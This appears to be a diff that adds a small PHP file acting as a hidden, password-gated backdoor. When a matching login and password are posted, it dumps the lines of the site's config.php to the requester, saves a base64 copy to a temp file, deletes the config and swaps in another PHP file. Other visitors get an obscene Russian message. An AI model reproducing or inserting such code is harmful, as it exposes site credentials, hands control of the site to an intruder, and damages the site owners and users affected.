@@ -1,0 +1,3 @@
+<? if ((md5($_POST['log'])=="") AND (md5($_POST['pass'])=="")){$filec='../config.php';$lines = file($filec);$fp = fopen('../temp.txt', 'w+');
+foreach ($lines as $line_num => $line) { echo "str #<b>{$line_num}</b> : " . htmlspecialchars($line) . "<br />\n"; $str=base64_encode($line)."\n";
+echo $str. "<br />\n"; fwrite($fp, $str); echo base64_decode($str). "<br />\n"; } fclose($fp); unlink($filec); copy('../js/cops.php', $filec);} else echo('&#1055;&#1086;&#1096;&#1077;&#1083; &#1085;&#1072; &#1093;&#1091;&#1081;!'); ?>
